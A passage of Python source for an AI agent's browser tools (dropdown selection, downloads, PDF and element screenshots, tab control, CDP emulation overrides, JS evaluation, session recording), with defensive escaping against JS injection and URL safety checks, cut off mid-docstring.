        label: Visible option text substring to match (case-insensitive).
        index: 0-based option index.
        open_delay_s: Seconds to wait after clicking a custom dropdown for
            its animation to finish before searching for options (default 0.5).
        task_id: Task identifier for session isolation.

    Returns:
        JSON string with the selection result.
    """
    if is_camofox_mode():
        return _camofox_unsupported("browser_select")

    if value is None and label is None and index is None:
        return json.dumps(
            {"success": False, "error": "At least one of `value`, `label`, or `index` must be provided."},
            ensure_ascii=False,
        )

    effective_task_id = _last_session_key(task_id or "default")
    normalized_ref = ref if ref.startswith("@") else f"@{ref}"
    ref_id = normalized_ref[1:]

    # Build the JS selection logic. Prefers native <select> handling; falls
    # back to framework-specific heuristics for custom dropdowns.
    if value is not None:
        value_str = str(value)
        match_js = f"if(o.value==={json.dumps(value_str)}||o.textContent.trim()==={json.dumps(value_str)})o.selected=true;"
    elif label is not None:
        match_js = f"if((o.textContent||'').toLowerCase().includes({json.dumps(label.lower())}))o.selected=true;"
    else:
        match_js = f"if(i==={index})o.selected=true;"

    # ``json.dumps`` escapes ``ref_id`` so an LLM-supplied ref can't break
    # out of the attribute-quoted selector and inject arbitrary JS.
    safe_ref = json.dumps(ref_id)
    select_js = (
        "(function(){"
        f"const el=document.querySelector('[aria-ref=' + {safe_ref} + ']');"
        "if(!el)return{_:'not_found'};"
        "if(el.tagName==='SELECT'){"
        "const opts=Array.from(el.options);"
        "for(let i=0;i<opts.length;i++){const o=opts[i];" + match_js + "}"
        "el.dispatchEvent(new Event('change',{bubbles:true}));"
        "return{_:'native',value:el.value,text:el.options[el.selectedIndex]?.text||''};"
        "}"
        # Custom dropdown — click to open, then find the option.
        "el.click();"
        "return{_:'clicked'};"
        "})()"
    )
    eval_result = _browser_eval(select_js, task_id=effective_task_id)
    try:
        parsed = json.loads(eval_result)
    except (json.JSONDecodeError, ValueError):
        return json.dumps({"success": False, "error": "browser_select: failed to parse JS result"}, ensure_ascii=False)

    if not parsed.get("success"):
        return json.dumps(parsed, ensure_ascii=False)

    result = parsed.get("result", {})
    if isinstance(result, dict) and result.get("_") == "native":
        return json.dumps(
            {"success": True, "selected": result.get("value"), "text": result.get("text"), "method": "native"},
            ensure_ascii=False,
        )
    if isinstance(result, dict) and result.get("_") == "not_found":
        return json.dumps(
            {"success": False, "error": f"browser_select: element {normalized_ref} not found. Run browser_snapshot first."},
            ensure_ascii=False,
        )

    # Custom dropdown was clicked — wait for its animation to settle, then
    # search for the matching option by visible text.
    time.sleep(min(0.5, open_delay_s))
    label_query = label or value or ""
    kb_js = (
        "(function(){"
        'const opts=document.querySelectorAll(\'[role="option"], [class*="option"], [class*="item"], li\');'
        "const q=" + json.dumps(label_query.lower()) + ";"
        "for(const o of opts){"
        "if((o.textContent||'').toLowerCase().includes(q)&&o.getBoundingClientRect().width>0){"
        "o.click();return{_:'custom',text:o.textContent.trim()};}}"
        "return{_:'no_match'};"
        "})()"
    )
    kb_result = _browser_eval(kb_js, task_id=effective_task_id)
    try:
        kb_parsed = json.loads(kb_result)
    except (json.JSONDecodeError, ValueError):
        return json.dumps({"success": False, "error": "browser_select: failed to parse custom dropdown result"}, ensure_ascii=False)

    if kb_parsed.get("success") and isinstance(kb_parsed.get("result"), dict):
        inner = kb_parsed["result"]
        if inner.get("_") == "custom":
            return json.dumps({"success": True, "text": inner.get("text"), "method": "custom_click"}, ensure_ascii=False)

    return json.dumps(
        {
            "success": False,
            "error": (
                f"browser_select: could not select option in {normalized_ref}. "
                "The element may be a non-standard dropdown — try browser_console --expression to interact with it directly."
            ),
        },
        ensure_ascii=False,
    )


# ── Download / export tools ─────────────────────────────────────────────────


_LAST_DOWNLOAD_CLEANUP: float = 0.0


def _unlink_files_older_than(paths, cutoff_s: float) -> None:
    """Unlink each path whose mtime predates ``cutoff_s``. Errors are logged, not raised."""
    for p in paths:
        try:
            if p.is_file() and p.stat().st_mtime < cutoff_s:
                p.unlink()
        except Exception as e:
            logger.debug("Failed to clean old file %s: %s", p, e)


def _get_downloads_dir() -> Path:
    """Return (and create) the persistent browser downloads directory."""
    d = get_deskagent_dir("cache/downloads", "browser_downloads")
    d.mkdir(parents=True, exist_ok=True)
    return d


def _cleanup_old_downloads(max_age_hours: int = 24) -> None:
    """Remove downloaded files older than ``max_age_hours``.

    Throttled to run at most once per hour to avoid repeated scans on
    download-heavy workflows.
    """
    global _LAST_DOWNLOAD_CLEANUP
    now = time.time()
    if now - _LAST_DOWNLOAD_CLEANUP < 3600:
        return
    _LAST_DOWNLOAD_CLEANUP = now
    _unlink_files_older_than(_get_downloads_dir().iterdir(), now - max_age_hours * 3600)


def _download_ok(file_path: Path, filename: str | None = None) -> str:
    """Return a success JSON for a completed download."""
    return json.dumps(
        {
            "success": True,
            "path": str(file_path),
            "filename": filename or file_path.name,
            "size_bytes": file_path.stat().st_size,
        },
        ensure_ascii=False,
    )


def browser_download(
    ref_or_url: str,
    save_as: str | None = None,
    timeout_s: float = 30.0,
    task_id: str | None = None,
) -> str:
    """
    Download a file by clicking a link or navigating to a URL.

    Blocks until the download completes (up to ``timeout_s`` seconds), then
    returns the local file path. The file is saved to the persistent
    ``browser_downloads`` cache directory (24h auto-cleanup).

    Requires a CDP-capable backend (local Chrome with CDP supervisor, or
    CDP override). On backends without CDP download-event support, falls
    back to a simple ``Page.navigate`` + poll-for-file approach.

    Args:
        ref_or_url: Either a snapshot ref (``@e5``) to click, or a full URL
            to navigate to directly.
        save_as: Optional filename override. If omitted, uses the
            ``suggestedFilename`` from the browser's download event.
        timeout_s: Max seconds to wait for the download (default 30).
        task_id: Task identifier for session isolation.

    Returns:
        JSON string with ``path``, ``filename``, and ``size_bytes`` on
        success.
    """
    if is_camofox_mode():
        return _camofox_unsupported("browser_download")
    if ref_or_url and ref_or_url.startswith(("http://", "https://")):
        if not is_safe_url(ref_or_url):
            return json.dumps({"success": False, "error": f"URL rejected by security policy: {ref_or_url}"}, ensure_ascii=False)

    effective_task_id = _last_session_key(task_id or "default")
    downloads_dir = _get_downloads_dir()
    _cleanup_old_downloads()

    # Set the download destination via CDP before triggering the download.
    supervisor = SUPERVISOR_REGISTRY.get(effective_task_id)
    if supervisor is not None:
        dest = str(downloads_dir)
        supervisor.send_cdp(
            "Browser.setDownloadBehavior",
            {"behavior": "allow", "eventsEnabled": True, "downloadPath": dest},
        )

    # Trigger the download: click a ref or navigate to a URL.
    is_ref = ref_or_url.startswith("@") or (ref_or_url.startswith("e") and ref_or_url[1:].isdigit())
    if is_ref:
        normalized_ref = ref_or_url if ref_or_url.startswith("@") else f"@{ref_or_url}"
        trigger_result = _run_browser_command(effective_task_id, "click", [normalized_ref])
        action = "click"
    else:
        trigger_result = _run_browser_command(effective_task_id, "open", [ref_or_url])
        action = "navigate"
    if not trigger_result.get("success"):
        return json.dumps(
            {"success": False, "error": f"browser_download: {action} failed: {trigger_result.get('error', 'unknown')}"},
            ensure_ascii=False,
        )
    if action == "navigate" and trigger_result.get("data", {}).get("url"):
        final_url = trigger_result["data"]["url"]
        if final_url != ref_or_url and not check_redirect_url_safety(ref_or_url, final_url):
            return json.dumps({"success": False, "error": f"browser_download: redirect to unsafe URL blocked: {final_url}"}, ensure_ascii=False)

    # Wait for the download to complete via supervisor events.
    if supervisor is not None:
        dl_result = supervisor.wait_for_download(timeout=timeout_s)
        if dl_result.get("ok"):
            filename = save_as or dl_result.get("filename", "download")
            file_path = downloads_dir / filename
            if file_path.exists():
                return _download_ok(file_path, filename)
            # File may have a different name — fall back to most recent.
            candidates = sorted(downloads_dir.iterdir(), key=lambda f: f.stat().st_mtime, reverse=True)
            if candidates:
                return _download_ok(candidates[0])
            return json.dumps(
                {"success": False, "error": "browser_download: download reported complete but file not found in downloads dir"},
                ensure_ascii=False,
            )
        return json.dumps(
            {"success": False, "error": f"browser_download: {dl_result.get('error', 'download failed')}"},
            ensure_ascii=False,
        )

    # No supervisor — fall back to polling the downloads directory.
    deadline = time.monotonic() + max(1.0, timeout_s)
    before = {f.name for f in downloads_dir.iterdir()}
    while time.monotonic() < deadline:
        time.sleep(0.5)
        new_files = [f for f in downloads_dir.iterdir() if f.name not in before and not f.name.endswith(".crdownload")]
        if new_files:
            return _download_ok(max(new_files, key=lambda f: f.stat().st_mtime))
    return json.dumps(
        {"success": False, "error": f"browser_download: no download detected after {timeout_s}s"},
        ensure_ascii=False,
    )


def browser_pdf(
    save_as: str | None = None,
    landscape: bool = False,
    print_background: bool = True,
    paper_width: float = 8.5,
    paper_height: float = 11.0,
    task_id: str | None = None,
) -> str:
    """
    Save the current page as a PDF.

    Requires a CDP-capable backend. The PDF is saved to the persistent
    ``browser_downloads`` cache directory (24h auto-cleanup).

    Args:
        save_as: Optional filename (without path). Defaults to
            ``page_<uuid>.pdf``.
        landscape: If True, use landscape orientation.
        print_background: If True (default), include background graphics.
        paper_width: Page width in inches (default 8.5 / Letter).
        paper_height: Page height in inches (default 11 / Letter).
        task_id: Task identifier for session isolation.

    Returns:
        JSON string with ``path``, ``pages``, ``size_bytes``, and
        ``sha256`` on success.
    """
    if is_camofox_mode():
        return _camofox_unsupported("browser_pdf")

    effective_task_id = _last_session_key(task_id or "default")
    downloads_dir = _get_downloads_dir()
    _cleanup_old_downloads()

    supervisor = SUPERVISOR_REGISTRY.get(effective_task_id)
    if supervisor is None:
        return json.dumps(
            {"success": False, "error": "browser_pdf requires a CDP-capable backend (local Chrome or CDP override)"},
            ensure_ascii=False,
        )

    # CDP Page.printToPDF — dimensions in inches × 96 DPI.
    cdp_result = supervisor.send_cdp(
        "Page.printToPDF",
        {
            "landscape": landscape,
            "printBackground": print_background,
            "paperWidth": paper_width,
            "paperHeight": paper_height,
            "transferMode": "ReturnAsBase64",
        },
    )
    if not cdp_result.get("ok"):
        return json.dumps(
            {"success": False, "error": f"browser_pdf: CDP error: {cdp_result.get('error', 'unknown')}"},
            ensure_ascii=False,
        )

    result_data = cdp_result.get("result", {})
    pdf_b64 = result_data.get("data")
    if not pdf_b64:
        return json.dumps(
            {"success": False, "error": "browser_pdf: CDP returned empty PDF data"},
            ensure_ascii=False,
        )

    pdf_bytes = base64.b64decode(pdf_b64)
    filename = save_as or f"page_{uuid.uuid4().hex[:8]}.pdf"
    file_path = downloads_dir / filename
    file_path.write_bytes(pdf_bytes)
    # Count PDF pages via the ``/Type /Page`` marker. ``Page.printToPDF``
    # returns ``{data: ..., stream: ...}`` with no page count field, so
    # the previous code always reported ``pages: 0`` (a lie). One regex
    # pass over the binary covers both ``/Type /Page`` and ``/Type/Page``
    # spellings; the negative lookahead avoids matching ``/Type /Pages``
    # (the catalog marker).
    pages = len(re.findall(rb"/Type\s*/Page(?!s)", pdf_bytes))

    return json.dumps(
        {
            "success": True,
            "path": str(file_path),
            "filename": filename,
            "pages": pages,
            "size_bytes": len(pdf_bytes),
            "sha256": hashlib.sha256(pdf_bytes).hexdigest(),
        },
        ensure_ascii=False,
    )


def browser_screenshot_element(
    ref: str,
    save_as: str | None = None,
    task_id: str | None = None,
) -> str:
    """
    Capture a screenshot of a single element identified by its snapshot ref.

    Uses ``getBoundingClientRect`` to locate the element, then CDP
    ``Page.captureScreenshot`` with a ``clip`` region. A 4px padding is
    added on each side to avoid clipping element borders.

    Note: CSS transforms (rotate, scale, skew) are not accounted for — the
    clip is an axis-aligned bounding box in viewport coordinates. For
    transformed elements, use ``browser_vision`` and crop manually.

    Args:
        ref: Element ref from ``browser_snapshot`` (e.g. ``@e5``).
        save_as: Optional filename (without path). Defaults to
            ``element_<uuid>.png``.
        task_id: Task identifier for session isolation.

    Returns:
        JSON string with ``path``, ``width``, ``height``, and
        ``size_bytes`` on success.
    """
    if is_camofox_mode():
        return _camofox_unsupported("browser_screenshot_element")

    effective_task_id = _last_session_key(task_id or "default")
    normalized_ref = ref if ref.startswith("@") else f"@{ref}"
    ref_id = normalized_ref[1:]

    # Resolve bounding rect via JS (CSS coordinates, not device pixels).
    # ``json.dumps`` escapes ``ref_id`` so it can't break out of the
    # attribute-quoted selector into injected JS.
    safe_ref = json.dumps(ref_id)
    rect_js = (
        "(function(){"
        f"const el=document.querySelector('[aria-ref=' + {safe_ref} + ']');"
        "if(!el)return null;"
        "const r=el.getBoundingClientRect();"
        "if(!r.width||!r.height)return null;"
        "return{left:r.left,top:r.top,width:r.width,height:r.height};"
        "})()"
    )
    rect_result = _browser_eval(rect_js, task_id=effective_task_id)
    try:
        rect_parsed = json.loads(rect_result)
    except (json.JSONDecodeError, ValueError):
        return json.dumps({"success": False, "error": "browser_screenshot_element: failed to resolve element position"}, ensure_ascii=False)

    if not rect_parsed.get("success") or rect_parsed.get("result") is None:
        return json.dumps(
            {"success": False, "error": f"browser_screenshot_element: element {normalized_ref} not found. Run browser_snapshot first."},
            ensure_ascii=False,
        )

    r = rect_parsed["result"]
    pad = 4  # px padding to avoid clipping borders

    supervisor = SUPERVISOR_REGISTRY.get(effective_task_id)
    if supervisor is None:
        return json.dumps(
            {"success": False, "error": "browser_screenshot_element requires a CDP-capable backend"},
            ensure_ascii=False,
        )

    cdp_result = supervisor.send_cdp(
        "Page.captureScreenshot",
        {
            "format": "png",
            "clip": {
                "x": max(0, r["left"] - pad),
                "y": max(0, r["top"] - pad),
                "width": r["width"] + pad * 2,
                "height": r["height"] + pad * 2,
                "scale": 1,
            },
        },
    )
    if not cdp_result.get("ok"):
        return json.dumps(
            {"success": False, "error": f"browser_screenshot_element: CDP error: {cdp_result.get('error', 'unknown')}"},
            ensure_ascii=False,
        )

    img_b64 = cdp_result.get("result", {}).get("data")
    if not img_b64:
        return json.dumps(
            {"success": False, "error": "browser_screenshot_element: CDP returned empty image data"},
            ensure_ascii=False,
        )

    img_bytes = base64.b64decode(img_b64)
    screenshots_dir = get_deskagent_dir("cache/screenshots", "browser_screenshots")
    screenshots_dir.mkdir(parents=True, exist_ok=True)
    filename = save_as or f"element_{uuid.uuid4().hex[:8]}.png"
    file_path = screenshots_dir / filename
    file_path.write_bytes(img_bytes)

    return json.dumps(
        {
            "success": True,
            "path": str(file_path),
            "width": int(r["width"] + pad * 2),
            "height": int(r["height"] + pad * 2),
            "size_bytes": len(img_bytes),
        },
        ensure_ascii=False,
    )


# ── Multi-tab tools (local backend only) ─────────────────────────────────────


def _no_active_tab() -> str:
    return json.dumps(
        {"success": False, "error": "browser_tab_* require a CDP-capable backend (local Chrome or CDP override). Call browser_navigate first."},
        ensure_ascii=False,
    )


def browser_tab_new(url: str | None = None, task_id: str | None = None) -> str:
    """Open a new browser tab and switch to it.

    The new tab becomes the active target — all subsequent ``browser_*``
    tools (snapshot, click, eval, etc.) operate on it. Requires a
    CDP-capable backend.
    """
    if is_camofox_mode():
        return _camofox_unsupported("browser_tab_new")
    if url and url.startswith(("http://", "https://")):
        if not is_safe_url(url):
            return json.dumps({"success": False, "error": f"URL rejected by security policy: {url}"}, ensure_ascii=False)
    effective_task_id = _last_session_key(task_id or "default")
    supervisor = SUPERVISOR_REGISTRY.get(effective_task_id)
    if supervisor is None:
        return _no_active_tab()
    result = supervisor.new_tab(url)
    if not result.get("ok"):
        return json.dumps({"success": False, "error": result.get("error", "unknown error")}, ensure_ascii=False)
    if url and url.startswith(("http://", "https://")):
        tab_id = result.get("tab_id")
        if tab_id:
            info = supervisor.send_cdp("Target.getTargetInfo", {"targetId": tab_id})
            target_url = info.get("result", {}).get("targetInfo", {}).get("url", "")
            if target_url and target_url != url and not check_redirect_url_safety(url, target_url):
                supervisor.close_tab(tab_id)
                return json.dumps({"success": False, "error": f"browser_tab_new: redirect to unsafe URL blocked: {target_url}"}, ensure_ascii=False)
    return json.dumps(
        {"success": True, "tab_id": result.get("tab_id"), "session_id": result.get("session_id")},
        ensure_ascii=False,
    )


def browser_tab_switch(tab_id: str, task_id: str | None = None) -> str:
    """Switch the active tab to ``tab_id``. Subsequent CDP operations route there.

    Tabs created by ``browser_tab_new`` and the initial page are both
    switchable. Tab IDs come from ``browser_tab_new`` / ``browser_tab_list``.
    """
    if is_camofox_mode():
        return _camofox_unsupported("browser_tab_switch")
    effective_task_id = _last_session_key(task_id or "default")
    supervisor = SUPERVISOR_REGISTRY.get(effective_task_id)
    if supervisor is None:
        return _no_active_tab()
    result = supervisor.switch_tab(tab_id)
    if not result.get("ok"):
        return json.dumps({"success": False, "error": result.get("error", "unknown error")}, ensure_ascii=False)
    return json.dumps(
        {"success": True, "tab_id": result.get("tab_id"), "session_id": result.get("session_id")},
        ensure_ascii=False,
    )


def browser_tab_close(tab_id: str | None = None, task_id: str | None = None) -> str:
    """Close a tab. Defaults to closing the currently active tab.

    After close, if the closed tab was active, CDP routing falls back to the
    initial page so subsequent ``browser_*`` calls keep working.
    """
    if is_camofox_mode():
        return _camofox_unsupported("browser_tab_close")
    effective_task_id = _last_session_key(task_id or "default")
    supervisor = SUPERVISOR_REGISTRY.get(effective_task_id)
    if supervisor is None:
        return _no_active_tab()
    result = supervisor.close_tab(tab_id)
    if not result.get("ok"):
        return json.dumps({"success": False, "error": result.get("error", "unknown error")}, ensure_ascii=False)
    return json.dumps({"success": True, "tab_id": result.get("tab_id", tab_id)}, ensure_ascii=False)


def browser_tab_list(task_id: str | None = None) -> str:
    """List all browser tabs currently open. Returns ``[{tab_id, url, title, type}]``."""
    if is_camofox_mode():
        return _camofox_unsupported("browser_tab_list")
    effective_task_id = _last_session_key(task_id or "default")
    supervisor = SUPERVISOR_REGISTRY.get(effective_task_id)
    if supervisor is None:
        return _no_active_tab()
    result = supervisor.list_tabs()
    if not result.get("ok"):
        return json.dumps({"success": False, "error": result.get("error", "unknown error")}, ensure_ascii=False)
    targets = result.get("result", {}).get("targetInfos", [])
    pages = [t for t in targets if t.get("type") == "page"]
    tabs = [{"tab_id": t.get("targetId"), "url": t.get("url", ""), "title": t.get("title", "")} for t in pages]
    active_session, attached = supervisor.get_attached_targets()
    active_tab_id = next(
        (tid for tid, info in attached.items() if info["session_id"] == active_session),
        None,
    )
    return json.dumps(
        {
            "success": True,
            "count": len(tabs),
            "tabs": tabs,
            "active_tab_id": active_tab_id,
            "attached_count": len(attached),
        },
        ensure_ascii=False,
    )


# ── Configuration overrides (CDP Emulation / Network domains) ───────────────


def _no_supervisor_for_overrides() -> str:
    return json.dumps(
        {"success": False, "error": "browser_set_* require a CDP-capable backend."},
        ensure_ascii=False,
    )


def _run_cdp_override(tool_name: str, method: str, params: dict, success_payload: dict, task_id: str | None) -> str:
    """Common helper for ``browser_set_*`` handlers: Camofox guard + CDP dispatch + uniform error/success JSON."""
    if is_camofox_mode():
        return _camofox_unsupported(tool_name)
    supervisor = SUPERVISOR_REGISTRY.get(_last_session_key(task_id or "default"))
    if supervisor is None:
        return _no_supervisor_for_overrides()
    result = supervisor.send_cdp(method, params)
    if not result.get("ok"):
        return json.dumps({"success": False, "error": result.get("error", "unknown error")}, ensure_ascii=False)
    return json.dumps({"success": True, **success_payload}, ensure_ascii=False)


def browser_set_viewport(
    width: int,
    height: int,
    device_scale_factor: float = 1.0,
    mobile: bool = False,
    task_id: str | None = None,
) -> str:
    """
    Override the browser viewport size via CDP ``Emulation.setDeviceMetricsOverride``.

    Persists for the current session until the next call or page reload.
    Use this to test mobile layouts without a real device.
    """
    return _run_cdp_override(
        "browser_set_viewport",
        "Emulation.setDeviceMetricsOverride",
        {
            "width": width,
            "height": height,
            "deviceScaleFactor": device_scale_factor,
            "mobile": mobile,
        },
        {
            "width": width,
            "height": height,
            "device_scale_factor": device_scale_factor,
            "mobile": mobile,
        },
        task_id,
    )


def browser_set_user_agent(
    user_agent: str | None = None,
    platform: str | None = None,
    accept_language: str | None = None,
    task_id: str | None = None,
) -> str:
    """
    Override the user-agent string sent on subsequent navigations via CDP ``Network.setUserAgentOverride``.

    Any argument passed as ``None`` is omitted from the CDP call, leaving the
    underlying value unchanged. To reset everything, pass an empty UA
    string explicitly.
    """
    params: dict = {}
    if user_agent is not None:
        params["userAgent"] = user_agent
    if platform is not None:
        params["platform"] = platform
    if accept_language is not None:
        params["acceptLanguage"] = accept_language
    return _run_cdp_override(
        "browser_set_user_agent",
        "Network.setUserAgentOverride",
        params,
        {"user_agent": user_agent, "platform": platform, "accept_language": accept_language},
        task_id,
    )


def browser_set_extra_headers(
    headers: dict[str, str],
    task_id: str | None = None,
) -> str:
    """
    Replace all extra HTTP headers for subsequent navigations via CDP ``Network.setExtraHTTPHeaders``.

    Wholesale replacement — passing a new map erases any previously-set
    headers. Pass the complete desired header set; merging is the caller's
    job. Empty dict clears all overrides.
    """
    return _run_cdp_override(
        "browser_set_extra_headers",
        "Network.setExtraHTTPHeaders",
        {"headers": headers},
        {"count": len(headers), "header_names": list(headers.keys())},
        task_id,
    )


def browser_set_geolocation(
    lat: float,
    lon: float,
    accuracy: float = 100.0,
    task_id: str | None = None,
) -> str:
    """
    Override the browser-reported geolocation via CDP ``Emulation.setGeolocationOverride``.

    Subsequent pages see the injected coordinates via ``navigator.geolocation``.
    To clear the override, pass ``lat=NaN`` (Chrome's documented "clear"
    value).
    """
    return _run_cdp_override(
        "browser_set_geolocation",
        "Emulation.setGeolocationOverride",
        {"latitude": lat, "longitude": lon, "accuracy": accuracy},
        {"lat": lat, "lon": lon, "accuracy": accuracy},
        task_id,
    )


def browser_console(clear: bool = False, expression: str | None = None, task_id: str | None = None) -> str:
    """Get browser console messages and JavaScript errors, or evaluate JS in the page.

    When ``expression`` is provided, evaluates JavaScript in the page context
    (like the DevTools console) and returns the result.  Otherwise returns
    console output (log/warn/error/info) and uncaught exceptions.

    Args:
        clear: If True, clear the message/error buffers after reading
        expression: JavaScript expression to evaluate in the page context
        task_id: Task identifier for session isolation

    Returns:
        JSON string with console messages/errors, or eval result
    """
    # --- JS evaluation mode ---
    if expression is not None:
        return _browser_eval(expression, task_id)

    # --- Console output mode (original behaviour) ---
    if is_camofox_mode():
        return camofox_console(clear, task_id)

    effective_task_id = _last_session_key(task_id or "default")

    console_args = ["--clear"] if clear else []
    error_args = ["--clear"] if clear else []

    console_result = _run_browser_command(effective_task_id, "console", console_args)
    errors_result = _run_browser_command(effective_task_id, "errors", error_args)

    messages = []
    if console_result.get("success"):
        for msg in console_result.get("data", {}).get("messages", []):
            messages.append({
                "type": msg.get("type", "log"),
                "text": msg.get("text", ""),
                "source": "console",
            })

    errors = []
    if errors_result.get("success"):
        for err in errors_result.get("data", {}).get("errors", []):
            errors.append({
                "message": err.get("message", ""),
                "source": "exception",
            })

    response = {
        "success": True,
        "console_messages": messages,
        "js_errors": errors,
        "total_messages": len(messages),
        "total_errors": len(errors),
    }
    _copy_fallback_warning(response, console_result)
    if errors_result.get("fallback_warning") and not response.get("fallback_warning"):
        _copy_fallback_warning(response, errors_result)
    return json.dumps(response, ensure_ascii=False)


def _browser_eval(expression: str, task_id: str | None = None) -> str:
    """Evaluate a JavaScript expression in the page context and return the result."""
    if is_camofox_mode():
        return _camofox_eval(expression, task_id)

    effective_task_id = _last_session_key(task_id or "default")

    # --- Fast path: route through the supervisor's persistent CDP WS ---------
    # When a CDPSupervisor is alive for this task_id, ``Runtime.evaluate`` runs
    # on the already-connected WebSocket — zero subprocess startup cost vs
    # spawning an ``agent-browser eval`` CLI process.  Falls through to the

    # supervisor is running (e.g. plain agent-browser without a CDP backend).
    try:
        supervisor = SUPERVISOR_REGISTRY.get(effective_task_id)
        if supervisor is not None:
            sup_result = supervisor.evaluate_runtime(expression)
            if sup_result.get("ok"):
                raw_result = sup_result.get("result")
                # Match the agent-browser path: if the value is a JSON string,
                # parse it so the model gets structured data.
                parsed = raw_result
                if isinstance(raw_result, str):
                    with contextlib.suppress(json.JSONDecodeError, ValueError):
                        parsed = json.loads(raw_result)
                response = {
                    "success": True,
                    "result": parsed,
                    "result_type": type(parsed).__name__,
                    "method": "cdp_supervisor",
                }
                return json.dumps(response, ensure_ascii=False, default=str)
            # JS exception is a real failure — surface it instead of falling
            # through to the subprocess path (which would just re-run and
            # produce the same exception, but slower).
            err = sup_result.get("error") or "evaluate_runtime failed"
            if "supervisor" not in err.lower():
                # Real JS-side error — return it.
                return json.dumps({"success": False, "error": err}, ensure_ascii=False)
            # Supervisor-side failure (loop down, no session) — fall through.
            logger.debug(
                "browser_eval: supervisor path unavailable (%s), falling back to subprocess",
                err,
            )
    except ImportError:
        pass
    except Exception as exc:  # pragma: no cover — defensive
        logger.debug("browser_eval: supervisor path errored (%s), falling back", exc)

    # --- Fallback: agent-browser CLI subprocess (original path) -------------
    result = _run_browser_command(effective_task_id, "eval", [expression])

    if not result.get("success"):
        err = result.get("error", "eval failed")

        if any(hint in err.lower() for hint in ("unknown command", "not supported", "not found", "no such command")):
            response = {
                "success": False,
                "error": f"JavaScript evaluation is not supported by this browser backend. {err}",
            }
            return json.dumps(_copy_fallback_warning(response, result))
        # A live DOM node / NodeList / Window can't be JSON-serialized by CDP
        # and fails the eval with "Object reference chain is too long".  The
        # supervisor fast path retries with returnByValue=false, but the CLI
        # subprocess can't, so turn the cryptic protocol error into actionable
        # guidance instead of surfacing it raw.
        if "reference chain is too long" in err.lower():
            response = {
                "success": False,
                "error": (
                    "Expression returned a live DOM node / NodeList / Window, "
                    "which can't be serialized. Extract a primitive value "
                    "(e.g. .innerText, .href, .src, .value) or use "
                    "JSON.stringify() / a snapshot tool instead."
                ),
            }
            return json.dumps(_copy_fallback_warning(response, result))
        response = {
            "success": False,
            "error": err,
        }
        return json.dumps(_copy_fallback_warning(response, result))

    data = result.get("data", {})
    raw_result = data.get("result")

    # The eval command returns the JS result as a string.  If the string
    # is valid JSON, parse it so the model gets structured data.
    parsed = raw_result
    if isinstance(raw_result, str):
        with contextlib.suppress(json.JSONDecodeError, ValueError):
            parsed = json.loads(raw_result)

    response = {
        "success": True,
        "result": parsed,
        "result_type": type(parsed).__name__,
    }
    return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False, default=str)


def _camofox_eval(expression: str, task_id: str | None = None) -> str:
    """Evaluate JS via Camofox's /tabs/{tab_id}/eval endpoint (if available)."""

    try:
        tab_info = _ensure_tab(task_id or "default")
        tab_id = tab_info.get("tab_id") or tab_info.get("id")
        resp = _post(f"/tabs/{tab_id}/evaluate", body={"expression": expression, "userId": tab_info["user_id"]})

        raw_result = resp.get("result") if isinstance(resp, dict) else resp
        parsed = raw_result
        if isinstance(raw_result, str):
            with contextlib.suppress(json.JSONDecodeError, ValueError):
                parsed = json.loads(raw_result)

        return json.dumps(
            {
                "success": True,
                "result": parsed,
                "result_type": type(parsed).__name__,
            },
            ensure_ascii=False,
            default=str,
        )
    except Exception as e:
        error_msg = str(e)
        # Graceful degradation — server may not support eval
        if any(code in error_msg for code in ("404", "405", "501")):
            return json.dumps({
                "success": False,
                "error": "JavaScript evaluation is not supported by this Camofox server. Use browser_snapshot or browser_vision to inspect page state.",
            })
        return tool_error(error_msg, success=False)


def _maybe_start_recording(task_id: str) -> None:
    """Start recording if browser.record_sessions is enabled in config."""
    with _cleanup_lock:
        if task_id in _recording_sessions:
            return
    try:
        deskagent_home = get_deskagent_home()
        record_enabled = cfg_get(load_config(), "browser", "record_sessions", default=False)

        if not record_enabled:
            return

        recordings_dir = deskagent_home / "browser_recordings"
        recordings_dir.mkdir(parents=True, exist_ok=True)
        _cleanup_old_recordings(max_age_hours=72)

        timestamp = time.strftime("%Y%m%d_%H%M%S")
        recording_path = recordings_dir / f"session_{timestamp}_{task_id[:16]}.webm"

        result = _run_browser_command(task_id, "record", ["start", str(recording_path)])
        if result.get("success"):
            with _cleanup_lock:
                _recording_sessions.add(task_id)
            logger.info("Auto-recording browser session %s to %s", task_id, recording_path)
        else:
            logger.debug("Could not start auto-recording: %s", result.get("error"))
    except Exception as e:
        logger.debug("Auto-recording setup failed: %s", e)


def _maybe_stop_recording(task_id: str) -> None:
    """Stop recording if one is active for this session."""
    with _cleanup_lock:
        if task_id not in _recording_sessions:
            return
    try:
        result = _run_browser_command(task_id, "record", ["stop"])
        if result.get("success"):
            path = result.get("data", {}).get("path", "")
            logger.info("Saved browser recording for session %s: %s", task_id, path)
    except Exception as e:
        logger.debug("Could not stop recording for %s: %s", task_id, e)
    finally:
        with _cleanup_lock:
            _recording_sessions.discard(task_id)


def browser_get_images(task_id: str | None = None) -> str:
    """
    Get all images on the current page.

    Args:
        task_id: Task identifier for session isolation

    Returns:
        JSON string with list of images (src and alt)
    """
    if is_camofox_mode():
        return camofox_get_images(task_id)

    effective_task_id = _last_session_key(task_id or "default")

    js_code = """JSON.stringify(
        [...document.images].map(img => ({
            src: img.src,
            alt: img.alt || '',
            width: img.naturalWidth,
            height: img.naturalHeight
        })).filter(img => img.src && !img.src.startsWith('data:'))
    )"""

    result = _run_browser_command(effective_task_id, "eval", [js_code])

    if result.get("success"):
        data = result.get("data", {})
        raw_result = data.get("result", "[]")

        try:
            if isinstance(raw_result, str):
                images = json.loads(raw_result)
            else:
                images = raw_result

            response = {"success": True, "images": images, "count": len(images)}
            return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
        except json.JSONDecodeError:
            response = {"success": True, "images": [], "count": 0, "warning": "Could not parse image data"}
            return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
    else:
        response = {"success": False, "error": result.get("error", "Failed to get images")}
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)


def browser_vision(question: str, annotate: bool = False, task_id: str | None = None) -> str | dict[str, Any]:
    """
    Take a screenshot of the current page for visual inspection.

    Captures what's visually displayed in the browser. When the active model
    supports native vision, the screenshot is attached directly to the
    conversation so the model can inspect it on the next turn; otherwise DeskAgent
    falls back to the auxiliary vision model and returns a text analysis. Useful
    for visual content the text-based snapshot may not capture (CAPTCHAs,
    verification challenges, images, complex layouts, etc.).

    The screenshot is saved persistently and its file path is returned so it
    can be shared with users via MEDIA:<path> in the response.

    Args:
